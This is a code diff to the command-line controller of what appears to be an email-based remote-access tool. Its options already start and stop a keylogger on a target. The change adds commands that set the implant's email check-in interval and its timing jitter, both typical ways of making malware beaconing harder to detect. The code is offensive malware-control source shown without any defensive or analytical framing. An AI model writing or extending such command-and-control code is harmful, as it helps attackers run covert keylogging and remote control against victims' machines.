@@ -294,6 +294,8 @@ if __name__ == '__main__':
     slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
     slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
     slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
+    slogopts.add_argument("-email-checkin",type=int, metavar='CHECK', dest='email_check', help='Seconds to wait before checking for new commands')
+    slogopts.add_argument("-jitter", metavar='jit',type=int, dest='jitter', help='Percentage of Jitter')
     
     if len(sys.argv) is 1:
         parser.print_help()
@@ -366,6 +368,12 @@ if __name__ == '__main__':
 
     elif args.stopkeylogger:
         gdog.sendEmail(args.id, jobid, 'stopkeylogger')
+
+    elif args.email_check:
+        gdog.sendEmail(args.id, jobid, 'email_check', args.email_check)
+
+    elif args.jitter:
+        gdog.sendEmail(args.id, jobid, 'jitter', args.jitter)
 
     elif args.jobid:
         gdog.getJobResults(args.id, args.jobid)
